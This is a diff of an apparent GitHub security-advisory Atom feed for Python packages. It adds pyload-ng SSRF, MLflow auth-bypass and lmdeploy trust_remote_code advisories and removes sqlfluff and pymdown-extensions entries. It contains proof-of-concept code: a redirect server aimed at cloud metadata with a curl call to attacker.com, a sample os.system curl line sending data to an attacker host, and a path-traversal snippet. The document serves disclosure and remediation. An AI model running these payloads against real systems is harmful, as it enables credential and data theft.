@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-05-21T19:31:53.035Z</updated>
+    <updated>2026-05-21T20:31:25.111Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,370 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[pyload-ng] pyload-ng: SSRF via HTTP Redirect Bypass in parse_urls API]]></title>
+        <id>https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</id>
+        <link href="https://github.com/advisories/GHSA-8rp3-xc6w-5qp5"/>
+        <updated>2026-05-21T19:54:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The SSRF mitigation added in commit <code>33c55da</code> for GHSA-7gvf-3w72-p2pg is incomplete. The <code>PREREQFUNCTION</code>-based private IP check was correctly applied to <code>HTTPChunk</code> (download path) but not to <code>HTTPRequest</code> (used by the <code>parse_urls</code> API). An authenticated attacker can supply a URL pointing to an attacker-controlled server that responds with a 302 redirect to an internal/private IP address, bypassing the <code>is_global_host()</code> check on the initial URL.</p>
+<h2 id="details">Details</h2>
+<p>The <code>parse_urls</code> API method validates the initial URL hostname:</p>
+<pre><code class="language-python"># src/pyload/core/api/__init__.py:600-604
+if url:
+    urlp = urlparse(url)
+    hostname = urlp.hostname
+    if urlp.scheme in ("http", "https") and hostname and is_global_host(hostname):
+        page = get_url(url)
+</code></pre>
+<p><code>get_url()</code> is imported from <code>request_factory.py</code> and creates an <code>HTTPRequest</code> with default settings:</p>
+<pre><code class="language-python"># src/pyload/core/network/request_factory.py:58-64
+def get_url(self, *args, **kwargs):
+    with HTTPRequest(None, self.get_options()) as h:
+        rep = h.load(*args, **kwargs)
+    return rep
+</code></pre>
+<p><code>HTTPRequest.__init__</code> sets <code>allow_private_ip = True</code> by default:</p>
+<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:75
+self.allow_private_ip = True
+</code></pre>
+<p>The <code>init_handle()</code> method enables redirect following:</p>
+<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:117-118
+self.c.setopt(pycurl.FOLLOWLOCATION, 1)
+self.c.setopt(pycurl.MAXREDIRS, 10)
+</code></pre>
+<p>The <code>_pre_request_callback</code> that should block redirects to private IPs is a no-op when <code>allow_private_ip</code> is <code>True</code>:</p>
+<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:574-582
+def _pre_request_callback(self, conn_primary_ip, conn_local_ip, conn_primary_port, conn_local_port):
+    if not self.allow_private_ip and not is_global_address(conn_primary_ip):
+        return pycurl.PREREQFUNC_ABORT
+    return pycurl.PREREQFUNC_OK
+</code></pre>
+<p>The fix at commit <code>33c55da</code> correctly set <code>allow_private_ip = False</code> in <code>HTTPChunk</code> (http_chunk.py:136) for the download path, but <code>HTTPRequest</code> used by <code>RequestFactory.get_url()</code> retains the default of <code>True</code>, leaving the <code>parse_urls</code> API unprotected against redirect-based SSRF.</p>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Start a redirect server on attacker-controlled host
+python3 -c "
+from http.server import BaseHTTPRequestHandler, HTTPServer
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
+        self.end_headers()
+HTTPServer(('0.0.0.0', 8888), H).serve_forever()
+"
+
+# Step 2: Authenticated user with ADD permission calls parse_urls
+curl -X POST 'http://pyload-host:8000/api/parse_urls' \
+  -H 'Cookie: session=&lt;valid_session&gt;' \
+  -d 'url=http://attacker.com:8888/redirect'
+
+# Expected flow:
+# 1. is_global_host('attacker.com') -&gt; True (passes validation)
+# 2. get_url() creates HTTPRequest with allow_private_ip=True
+# 3. pycurl fetches attacker.com:8888, receives 302 -&gt; http://169.254.169.254/latest/meta-data/
+# 4. _pre_request_callback runs but skips check (allow_private_ip=True)
+# 5. pycurl follows redirect to cloud metadata endpoint
+# 6. Response body parsed by RE_URLMATCH, any URLs in metadata returned to attacker
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An authenticated attacker with ADD permission can perform SSRF against:</p>
+<ul>
+<li><strong>Cloud metadata endpoints</strong> (AWS IMDSv1 at <code>169.254.169.254</code>, GCP, Azure) — potentially leaking IAM credentials, instance metadata, and secrets</li>
+<li><strong>Internal services</strong> on private networks (e.g., <code>10.x.x.x</code>, <code>172.16.x.x</code>, <code>192.168.x.x</code>)</li>
+<li><strong>Localhost services</strong> (<code>127.0.0.1</code>) running on the pyload server</li>
+</ul>
+<p>Data exfiltration is partially limited by the <code>RE_URLMATCH</code> regex filter (only URL-like strings from the response body are returned), but cloud metadata responses often contain URLs or URL-like paths that match this pattern. The <code>REDIR_PROTOCOLS</code> setting limits redirects to HTTP/HTTPS only.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Set <code>allow_private_ip = False</code> in <code>RequestFactory.get_url()</code>:</p>
+<pre><code class="language-python"># src/pyload/core/network/request_factory.py
+def get_url(self, *args, **kwargs):
+    with HTTPRequest(None, self.get_options()) as h:
+        h.allow_private_ip = False  # Prevent SSRF via redirects
+        rep = h.load(*args, **kwargs)
+    return rep
+</code></pre>
+<p>Alternatively, change the default in <code>HTTPRequest.__init__</code> to <code>False</code>:</p>
+<pre><code class="language-python"># src/pyload/core/network/http/http_request.py:75
+self.allow_private_ip = False
+</code></pre>
+<p>The second approach is more defensive (secure by default), but may require auditing other callers that legitimately need to access private IPs. The first approach is the targeted fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5">https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5</a></li>
+<li><a href="https://github.com/advisories/GHSA-8rp3-xc6w-5qp5">https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8rp3-xc6w-5qp5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-21T19:54:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mlflow] MLflow: unauthenticated access to certain FastAPI routes]]></title>
+        <id>https://github.com/advisories/GHSA-75cm-x2w3-8mgf</id>
+        <link href="https://github.com/advisories/GHSA-75cm-x2w3-8mgf"/>
+        <updated>2026-05-21T19:35:52.000Z</updated>
+        <content type="html"><![CDATA[<p>A vulnerability in mlflow/mlflow versions 3.9.0 and earlier allows unauthenticated access to certain FastAPI routes when the server is started with authentication enabled (<code>--app-name basic-auth</code>) and served via uvicorn (ASGI). The FastAPI permission middleware only enforces authentication on <code>/gateway/</code> routes, leaving other routes such as the Job API (<code>/ajax-api/3.0/jobs/*</code>) and the OpenTelemetry trace ingestion API (<code>/v1/traces</code>) unprotected. This allows unauthenticated remote attackers to submit jobs, read job results, cancel running jobs, and inject arbitrary trace data into experiments. The issue arises from an architectural mismatch between Flask and FastAPI authentication mechanisms, where the <code>_find_fastapi_validator()</code> function fails to handle non-<code>/gateway/</code> paths, resulting in a complete authentication bypass. This vulnerability is fixed in version 3.10.0.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2652">https://nvd.nist.gov/vuln/detail/CVE-2026-2652</a></li>
+<li><a href="https://github.com/mlflow/mlflow/commit/bb62e773263c14e9ba4d1a82fe72d0de2442c6aa">https://github.com/mlflow/mlflow/commit/bb62e773263c14e9ba4d1a82fe72d0de2442c6aa</a></li>
+<li><a href="https://huntr.com/bounties/5aeff5f0-49c7-4180-b5cb-c9a046f16756">https://huntr.com/bounties/5aeff5f0-49c7-4180-b5cb-c9a046f16756</a></li>
+<li><a href="https://github.com/advisories/GHSA-75cm-x2w3-8mgf">https://github.com/advisories/GHSA-75cm-x2w3-8mgf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-75cm-x2w3-8mgf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-15T03:30:37.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lmdeploy] lmdeploy: Hardcoded trust_remote_code=True is an implicit unsafe remote-code load path with no user opt-out]]></title>
+        <id>https://github.com/advisories/GHSA-9xq9-36w5-q796</id>
+        <link href="https://github.com/advisories/GHSA-9xq9-36w5-q796"/>
+        <updated>2026-05-21T19:33:33.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<h2 id="📋-reframing-2026-05-02-implicit-unsafe-remote-code-path-not-supply-chain">📋 Reframing (2026-05-02): implicit unsafe remote-code path, not "supply-chain"</h2>
+<p>The accurate description of this vulnerability is:
+<strong>"<code>get_model_arch</code> and related helpers hardcode <code>trust_remote_code=True</code>
+with no opt-out, creating an implicit unsafe remote-code load path
+on every model fetch."</strong></p>
+<p>What this report does NOT claim:</p>
+<ul>
+<li>It is NOT a network-attack RCE — the user supplies the model
+reference; LMDeploy honors it.</li>
+<li>It is NOT a "supply chain" CVE in the classical sense (where a
+benign upstream is compromised) — the user explicitly types the
+repo name.</li>
+</ul>
+<p>What this report DOES claim:</p>
+<ul>
+<li>Other inference frameworks (vLLM, TGI, Hugging Face transformers
+itself) all expose <code>--trust-remote-code</code> as <strong>opt-in</strong> so that
+users who consciously load known-safe repos can opt in, while
+users following a tutorial cannot accidentally execute attacker
+Python by typing a wrong repo name.</li>
+<li>LMDeploy's hardcoded True is an <strong>implicit</strong> trust-boundary
+override that violates HF Transformers' default-secure stance
+(<code>trust_remote_code=False</code> since transformers ≥ 4.30).</li>
+<li>The fix is a one-line CLI flag (<code>--trust-remote-code</code>) defaulting
+False, threaded through the three sites, matching the rest of
+the ecosystem.</li>
+</ul>
+<p>Severity should be assessed as <strong>hardening / safe-by-default</strong>,
+not as full unauthenticated RCE. CVSS revised to <strong>5.5 Medium</strong>
+(<code>AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> × user-must-load qualifier).</p>
+<p>Runtime evidence: see <code>12_lmdeploy_trust_remote_code_F13/runtime_evidence/cloudrun_cpu_verdict.txt</code>.</p>
+</blockquote>
+<hr>
+<h1 id="f13--lmdeploy-hardcoded-trust_remote_codetrue-enables-hf-supply-chain-rce-without-user-opt-in">F13 — LMDeploy: hardcoded <code>trust_remote_code=True</code> enables HF supply-chain RCE without user opt-in</h1>
+<p><strong>Reporter:</strong> ibondarenko1 / <a href="mailto:sactransport2000@gmail.com">sactransport2000@gmail.com</a>
+<strong>Coordinated-disclosure window:</strong> 90 days from initial vendor email.</p>
+<h2 id="tldr">TL;DR</h2>
+<p>LMDeploy unilaterally passes <code>trust_remote_code=True</code> to
+<code>transformers.AutoConfig.from_pretrained()</code> (and several other
+<code>from_pretrained</code> callers) <strong>regardless of any user opt-in</strong>. The
+flag is hardcoded <code>True</code> in source — there is no CLI flag, no
+environment variable, no parameter, and no warning that lets a
+user refuse remote code execution from the model repository.
+This is a <strong>silent override of HuggingFace Transformers' own
+default-secure stance</strong> (<code>trust_remote_code=False</code>) introduced
+in HF Transformers ≥ 4.30 specifically to prevent this class of
+supply-chain RCE.</p>
+<p>The user running <code>lmdeploy serve api_server &lt;attacker_repo&gt;</code>,
+<code>lmdeploy lite calibrate &lt;attacker_repo&gt;</code>, etc. has <strong>no way to
+opt out</strong>. The only escape hatch is for the user to never load
+any third-party HF repo with LMDeploy — which is incompatible
+with LMDeploy's documented use case.</p>
+<p>HuggingFace's <code>trust_remote_code=False</code> default exists exactly to
+prevent silent RCE when loading a third-party repo. LMDeploy overrides
+this default, restoring the unsafe behaviour transparently. A malicious
+HF repo with a <code>configuration_*.py</code> shim runs Python code as the
+LMDeploy user at the very first call to <code>get_model_arch(...)</code>.</p>
+<p>This is a documented anti-pattern (see HF Hub docs:
+"Trusting custom code is therefore tricky..."). Multiple peer
+projects fixed similar issues — e.g. Hugging Face Transformers
+itself made this opt-in by default, and <code>vllm</code> exposes the flag
+through <code>--trust-remote-code</code> rather than hardcoding it.</p>
+<h2 id="affected-version">Affected version</h2>
+<ul>
+<li>Repository: <code>github.com/InternLM/lmdeploy</code>, branch <code>main</code>.</li>
+<li>Branch SHA at audit time: <code>9df0eff7c38ae69b9d4b9f7ad1441e484d439f92</code>
+(2026-05-02).</li>
+<li>Pinned blob SHAs:<ul>
+<li><code>lmdeploy/archs.py</code> → <code>68fa03a407734be1e2ae04098d34e9acdbe98262</code></li>
+<li><code>lmdeploy/lite/apis/calibrate.py</code> →
+<code>0728304bdc3c03eee1d790bfbd5496df080a0ecd</code></li>
+<li><code>lmdeploy/lite/utils/load.py</code> →
+<code>7c61677aa01e2d9881e32f8ca8ef6ad0f1d8b120</code></li>
+<li><code>lmdeploy/pytorch/check_env/model.py</code> →
+<code>b1a2daaa426bf5fe25030f7913c703eed9f5b261</code></li>
+</ul>
+</li>
+</ul>
+<p>Snapshots of all four files are in <code>source_pinned/</code>.</p>
+<h2 id="source-level-evidence">Source-level evidence</h2>
+<h3 id="site-1--architecture-detection-every-load-goes-through-here">Site 1 — architecture detection (every load goes through here)</h3>
+<p><code>lmdeploy/archs.py:147-157</code> — <code>get_model_arch</code>:</p>
+<pre><code class="language-python">def get_model_arch(model_path: str):
+    """Get a model's architecture and configuration."""
+    try:
+        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=True)
+    except Exception as e:  # noqa
+        from transformers import PretrainedConfig
+        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=True)
+</code></pre>
+<p><strong>Both</strong> the primary path and the fallback hardcode
+<code>trust_remote_code=True</code>. There is no parameter to override it. This
+function is called from every model-loading path in lmdeploy.</p>
+<h3 id="site-2--quantization-cli">Site 2 — quantization CLI</h3>
+<p><code>lmdeploy/lite/apis/calibrate.py:248-251</code>:</p>
+<pre><code class="language-python">tokenizer = AutoTokenizer.from_pretrained(model, trust_remote_code=True)
+...
+model = load_hf_from_pretrained(model, dtype=dtype, trust_remote_code=True)
+</code></pre>
+<p><code>lmdeploy lite calibrate &lt;repo&gt;</code> and downstream quant CLIs (gptq,
+awq) all flow through this. Hardcoded.</p>
+<h3 id="site-3--calibration-helper">Site 3 — calibration helper</h3>
+<p><code>lmdeploy/lite/utils/load.py:55</code>:</p>
+<pre><code class="language-python">def load_hf_from_pretrained(pretrained_model_name_or_path, dtype, **kwargs):
+    ...
+    hf_config = AutoConfig.from_pretrained(pretrained_model_name_or_path, trust_remote_code=True)
+</code></pre>
+<p>Even if the caller does not pass <code>trust_remote_code=True</code> in
+<code>**kwargs</code>, the helper internally hardcodes it on the config call
+(line 55), then loads the model on line 74. The config call alone is
+sufficient for RCE: HF Transformers downloads <code>configuration_*.py</code>
+from the repo and <code>import</code>s it whenever <code>trust_remote_code=True</code>.</p>
+<h3 id="site-4--pytorch-engine-check">Site 4 — pytorch engine check</h3>
+<p><code>lmdeploy/pytorch/check_env/model.py:10,99,234,242</code> —
+<code>trust_remote_code: bool = True</code> is the default value for the engine's
+parameter. Unlike the three sites above, this is "default true" not
+"hardcoded true" — a determined caller can pass False — but every
+shipped CLI passes True or relies on the default.</p>
+<h3 id="what-trust_remote_codetrue-actually-enables">What <code>trust_remote_code=True</code> actually enables</h3>
+<p>When <code>AutoConfig.from_pretrained(repo, trust_remote_code=True)</code> is
+called and the repo's <code>config.json</code> contains an <code>auto_map</code> key
+pointing to a custom <code>configuration_&lt;name&gt;.py</code>:</p>
+<ol>
+<li>HF Transformers downloads the <code>.py</code> file from the repo.</li>
+<li>HF imports the module via <code>importlib</code>, <strong>executing the file's
+top-level code</strong> (any <code>print</code>, <code>os.system</code>, <code>subprocess.run</code>,
+<code>urllib.request.urlopen</code>, etc. fires now).</li>
+<li>HF then instantiates the named class.</li>
+</ol>
+<p>So a malicious repo only needs a top-level
+<code>os.system("curl https://attacker/?$(whoami)")</code> in
+<code>configuration_evil.py</code>. It runs as the lmdeploy process user.</p>
+<h2 id="threat-model">Threat model</h2>
+<p><strong>Attack surface.</strong> Any user who runs an lmdeploy CLI command against
+a HuggingFace repo identifier they did not personally vet. This
+includes:</p>
+<ul>
+<li>Casual users following a tutorial that says
+<code>lmdeploy serve api_server &lt;some_repo&gt;</code>.</li>
+<li>CI pipelines that automatically pull a model from HF Hub by
+configuration (e.g. updates to a non-Pinned version tag).</li>
+<li>Researchers comparing models from many authors. Even running
+<code>lmdeploy lite calibrate</code> for benchmarking is enough.</li>
+</ul>
+<p>The user is <strong>not warned</strong> that arbitrary Python from the repo will
+execute, and there is <strong>no flag</strong> to disable it. The CVE class is
+CWE-94 (Improper Control of Generation of Code, supply-chain
+flavour) and CWE-915 (Improperly Controlled Modification of
+Dynamically-Determined Object Attributes).</p>
+<h2 id="comparison-to-peer-projects">Comparison to peer projects</h2>
+<table>
+<thead>
+<tr>
+<th>Project</th>
+<th>trust_remote_code default</th>
+<th>User control</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HuggingFace Transformers</td>
+<td>False</td>
+<td><code>trust_remote_code</code> keyword arg</td>
+</tr>
+<tr>
+<td>vLLM</td>
+<td>False</td>
+<td><code>--trust-remote-code</code> flag</td>
+</tr>
+<tr>
+<td><strong>LMDeploy</strong></td>
+<td><strong>True (hardcoded)</strong></td>
+<td><strong>None</strong></td>
+</tr>
+<tr>
+<td>TGI</td>
+<td>False</td>
+<td><code>--trust-remote-code</code> flag</td>
+</tr>
+</tbody></table>
+<p>LMDeploy is the outlier. The rationale is presumably "internal
+models like InternLM need custom configuration_*.py", but the fix is
+to accept a CLI flag like <code>--trust-remote-code</code> and default-False as
+the rest of the ecosystem does.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Replace every hardcoded <code>trust_remote_code=True</code> with an explicit
+opt-in via CLI flag:</p>
+<pre><code class="language-python"># lmdeploy/archs.py — get_model_arch
+def get_model_arch(model_path: str, trust_remote_code: bool = False):
+    try:
+        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
+    except Exception as e:  # noqa
+        from transformers import PretrainedConfig
+        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
+</code></pre>
+<p>Wire <code>trust_remote_code</code> through every call site. Add <code>--trust-remote-code</code>
+to lmdeploy's CLI parser and forward it from server / calibrate /
+gptq / etc. <strong>Default False</strong>.</p>
+<p>A patch fragment is in <code>patch.diff</code>.</p>
+<h2 id="disclosure-plan">Disclosure plan</h2>
+<ol>
+<li>Submit privately via lmdeploy security contact (typically email or
+GitHub Security Advisory at
+<code>https://github.com/InternLM/lmdeploy/security/advisories/new</code>).</li>
+<li>Reference Hugging Face Transformers' historical opt-out → opt-in
+change as precedent for the fix shape.</li>
+<li>90-day coordinated-disclosure window starting from acknowledgement.</li>
+<li>Request CVE through GHSA flow once the patch lands.</li>
+</ol>
+<h2 id="why-static-only-is-sufficient-here">Why static-only is sufficient here</h2>
+<p>Unlike F11 (RCE chain through <code>_load_pt_file</code>) which required a
+runtime PoC to demonstrate the pickle gadget execution, this finding
+is a <strong>single trust-flag flip</strong> — the behaviour of
+<code>AutoConfig.from_pretrained(repo, trust_remote_code=True)</code> on a HF
+repo with a malicious <code>configuration_*.py</code> is documented behaviour of
+HF Transformers itself (their own docs warn against it). Reproducing
+it adds no new evidence; the static flag-state is the bug.</p>
+<p>If the vendor requests a runtime PoC during triage we will provide
+one (a malicious HF repo with <code>configuration_evil.py</code> + a one-liner
+<code>lmdeploy lite calibrate &lt;repo&gt;</code> invocation), but holding it back from
+the initial advisory avoids publishing a working exploit during the
+disclosure window.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796</a></li>
+<li><a href="https://github.com/advisories/GHSA-9xq9-36w5-q796">https://github.com/advisories/GHSA-9xq9-36w5-q796</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9xq9-36w5-q796</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-21T19:33:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[crawlee] Crawlee for Python: SSRF via sitemap-derived URLs]]></title>
         <id>https://github.com/advisories/GHSA-3r75-xc34-5f44</id>
@@ -1379,177 +1743,5 @@ cached_folder = snapshot_download(...)  # ← sees commit B, downloads pipeline.
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-19T20:10:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[sqlfluff] SQLFluff: Recursive Stack Overflow in Parser]]></title>
-        <id>https://github.com/advisories/GHSA-wmhf-fqc8-vxhh</id>
-        <link href="https://github.com/advisories/GHSA-wmhf-fqc8-vxhh"/>
-        <updated>2026-05-19T20:10:19.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>In deployments where untrusted users can provide SQL queries to be linted, an untrusted user can submit a malicious query with deliberate excessive nesting to any application using the parser to trigger a Denial of Service through resource exhaustion.</p>
-<h3 id="patches">Patches</h3>
-<p>Versions 4.1.0 and up contain a configurable recursion limit, which is enabled by default, to prevent this manner of exploit.</p>
-<h3 id="credit">Credit</h3>
-<p>Ori Nakar from Imperva Threat Research Team.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-wmhf-fqc8-vxhh">https://github.com/sqlfluff/sqlfluff/security/advisories/GHSA-wmhf-fqc8-vxhh</a></li>
-<li><a href="https://github.com/advisories/GHSA-wmhf-fqc8-vxhh">https://github.com/advisories/GHSA-wmhf-fqc8-vxhh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wmhf-fqc8-vxhh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-19T20:10:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pymdown-extensions] Regression in pymdownx.snippets reintroduces sibling-prefix path traversal bypass despite restrict_base_path]]></title>
-        <id>https://github.com/advisories/GHSA-62q4-447f-wv8h</id>
-        <link href="https://github.com/advisories/GHSA-62q4-447f-wv8h"/>
-        <updated>2026-05-19T20:00:30.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
-<p><code>pymdownx.snippets</code> has a regression of the CVE-2023-32309 / GHSA-jh85-wwv9-24hv fix. With <code>restrict_base_path: True</code> (the default), the current <code>filename.startswith(base)</code> containment check does not enforce a directory boundary. As a result, a markdown snippet directive can read files from sibling paths that share the same prefix as <code>base_path</code>, such as <code>docs</code> vs <code>docs_internal</code>.</p>
-<p>The regression was introduced in PR #2039 / commit <code>7c13bda5b7793b172efd1abb6712e156a83fe07d</code>, which replaced the original directory-identity check with a plain string-prefix comparison.</p>
-<h1 id="details">Details</h1>
-<p>The regression was introduced in commit <code>7c13bda5b7793b172efd1abb6712e156a83fe07d</code> (2023-05-15, #2039 <em>"Fix regression of snippets nested deeply under specified base path"</em>), which relaxed the original <code>os.path.samefile(base, os.path.dirname(filename))</code> check to a plain <code>startswith(base)</code>.</p>
-<p><code>SnippetPreprocessor.get_snippet_path()</code> in <code>pymdownx/snippets.py</code>:</p>
-<pre><code class="language-python">if self.restrict_base_path:
-    filename = os.path.abspath(os.path.join(base, path))
-    # If the absolute path is no longer under the specified base path, reject the file
-    if not filename.startswith(base):
-        continue
-</code></pre>
-<p><code>base</code> is <code>os.path.abspath(b)</code> and has no trailing separator. <code>str.startswith(base)</code> is <code>True</code> for any <code>filename</code> whose string representation begins with the same characters as <code>base</code>, regardless of whether those characters end at a directory boundary.</p>
-<p>Concrete example:</p>
-<ul>
-<li><code>base = "/x/docs"</code></li>
-<li><code>path = "../docs_secret/leak.txt"</code> (inside the markdown snippet directive)</li>
-<li><code>os.path.join(base, path)</code> → <code>"/x/docs/../docs_secret/leak.txt"</code></li>
-<li><code>os.path.abspath(...)</code>     → <code>"/x/docs_secret/leak.txt"</code></li>
-<li><code>filename.startswith(base)</code> → <code>True</code>, because <code>"/x/docs_secret/..."</code> begins with the literal string <code>"/x/docs"</code>.</li>
-</ul>
-<p>All releases from <strong>10.0.1 (2023-05-15) through 10.21.2 (current)</strong> are affected.</p>
-<h1 id="impact">Impact</h1>
-<p>Arbitrary file read within the host the build runs on, bounded by the prefix match. With <code>base_path = /x/docs</code> the attacker can read files from any sibling directory whose path begins with the literal string <code>/x/docs</code> followed by any non-separator character — for example <code>/x/docs_internal/</code>, <code>/x/docs.bak/</code>, <code>/x/docs2/</code>.</p>
-<p>The threat model is the same as the original CVE-2023-32309: markdown content processed by the snippets preprocessor in a build pipeline (typical scenario: an MkDocs documentation site built in CI from PR contributions or otherwise less-trusted markdown) can read files outside the configured base. CI builds that publish the generated HTML expose the read file to the public; CI builds with secrets on disk leak those secrets.</p>
-<h1 id="reproduction">Reproduction</h1>
-<p>Minimal local PoC, non-destructive:</p>
-<pre><code class="language-python">import os, shutil, tempfile, markdown
-
-work = tempfile.mkdtemp(prefix="pmx_poc_")
-try:
-    base    = os.path.join(work, "docs")
-    sibling = os.path.join(work, "docs_secret")
-    os.makedirs(base)
-    os.makedirs(sibling)
-    with open(os.path.join(sibling, "leak.txt"), "w") as f:
-        f.write("TOP_SECRET_FROM_SIBLING_DIR\n")
-
-    out = markdown.markdown(
-        '--8&lt;-- "../docs_secret/leak.txt"\n',
-        extensions=["pymdownx.snippets"],
-        extension_configs={
-            "pymdownx.snippets": {
-                "base_path": [base],
-                "restrict_base_path": True,
-                "check_paths": True,
-            }
-        },
-    )
-    print(out)  # -&gt; &lt;p&gt;TOP_SECRET_FROM_SIBLING_DIR&lt;/p&gt;
-finally:
-    shutil.rmtree(work)
-</code></pre>
-<p>Default <code>restrict_base_path: True</code> is sufficient — no non-default option is required.</p>
-<h1 id="suggested-fix">Suggested fix</h1>
-<p>Minimal change — require the separator after the base prefix:</p>
-<pre><code class="language-diff">-                        if not filename.startswith(base):
-+                        # Append `os.sep` so a sibling directory whose name shares a prefix
-+                        # (e.g. `/x/docs` vs `/x/docs_evil`) cannot satisfy the check.
-+                        if not filename.startswith(base + os.sep):
-                             continue
-</code></pre>
-<p>This preserves the original intent (allow snippets nested at any depth under <code>base_path</code>) while restoring the directory-boundary check. It does not affect the <code>os.path.isdir(base)</code> branch where <code>base</code> is a file (that branch still uses <code>os.path.samefile</code>).</p>
-<p>Alternative: <code>os.path.commonpath([base, filename]) == base</code> is equivalent and slightly more idiomatic, though it raises <code>ValueError</code> on different drives on Windows and would need a <code>try/except</code>. The <code>startswith(base + os.sep)</code> fix is the smaller diff.</p>
-<p>Note: this fix does not change behaviour for symlinks inside <code>base_path</code>. The existing implementation uses <code>os.path.abspath</code> (not <code>os.path.realpath</code>), so a symlink within <code>base_path</code> pointing outside is still followed. That is a separate concern — symlinks require write access to <code>base_path</code>, a much higher bar than the current bypass — and matches the behaviour the CVE-2023 fix established.</p>
-<h1 id="regression-test">Regression test</h1>
-<p>A regression test class <code>TestSnippetsSiblingPrefix</code> was added in <code>tests/test_extensions/test_snippets.py</code>. It uses <code>tests/test_extensions/_snippets/nested</code> as <code>base_path</code> and a new fixture directory <code>tests/test_extensions/_snippets/nested_sibling_evil/leak.txt</code>. It asserts that the markdown directive <code>--8&lt;-- "../nested_sibling_evil/leak.txt"</code> raises <code>SnippetMissingError</code>.</p>
-<ul>
-<li>Without fix: test fails (<code>AssertionError: SnippetMissingError not raised</code>, sibling file is silently read).</li>
-<li>With fix: test passes.</li>
-</ul>
-<p>Full suite: <code>python -m pytest tests/ -q</code> → <strong>738 passed</strong> (737 baseline + 1 new regression test). No regressions.</p>
-<h1 id="affected-versions">Affected versions</h1>
-<p><code>&gt;= 10.0.1, &lt;= 10.21.2</code></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-62q4-447f-wv8h">https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-62q4-447f-wv8h</a></li>
-<li><a href="https://github.com/facelessuser/pymdown-extensions/pull/2039">https://github.com/facelessuser/pymdown-extensions/pull/2039</a></li>
-<li><a href="https://github.com/advisories/GHSA-62q4-447f-wv8h">https://github.com/advisories/GHSA-62q4-447f-wv8h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-62q4-447f-wv8h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-19T20:00:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[strawberry-graphql] Strawberry GraphQL: Default GraphiQL may expose HTTP headers in URLs]]></title>
-        <id>https://github.com/advisories/GHSA-x97m-qp5c-w9xj</id>
-        <link href="https://github.com/advisories/GHSA-x97m-qp5c-w9xj"/>
-        <updated>2026-05-19T15:55:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
